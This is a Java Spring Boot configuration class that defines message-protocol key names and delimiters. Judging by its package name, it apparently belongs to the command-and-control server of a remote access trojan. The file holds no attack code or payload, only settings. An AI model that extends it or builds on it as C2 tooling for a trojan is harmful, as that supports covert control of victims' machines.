package devs.alex.sah.rat.c2server.configuration;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.boot.context.properties.ConstructorBinding;
import org.springframework.boot.context.properties.bind.DefaultValue;

@ConstructorBinding
@ConfigurationProperties("message")
public class MessagesConfiguration{

    public final keys keys;
    public final Delimiters delimiters;

    public MessagesConfiguration(keys keys, Delimiters delimiters) {
        this.keys = keys;
        this.delimiters = delimiters;
    }

    public static class keys {

        public final String packageType;
        public final String recipientType;
        public final String recipientID;
        public final String module;
        public final String requestID;
        public final String responseType;
        public final String fullMessageSize;

        // TODO custom keys validation
        public keys(@DefaultValue("PT")  String packageType,
                    @DefaultValue("RT")  String recipientType,
                    @DefaultValue("RID") String recipientID,
                    @DefaultValue("M")   String module,
                    @DefaultValue("REQ") String requestID,
                    @DefaultValue("RPT") String responseType,
                    @DefaultValue("FS")  String fullMessageSize) {
            this.packageType = packageType;
            this.recipientType = recipientType;
            this.recipientID = recipientID;
            this.module = module;
            this.requestID = requestID;
            this.responseType = responseType;
            this.fullMessageSize = fullMessageSize;

        }
    }

    public static class Delimiters {
        public final char section;
        public final char value;
        public Delimiters(@DefaultValue("#") char section, @DefaultValue(":") char value) {
            this.section = section;
            this.value = value;
        }
    }
}
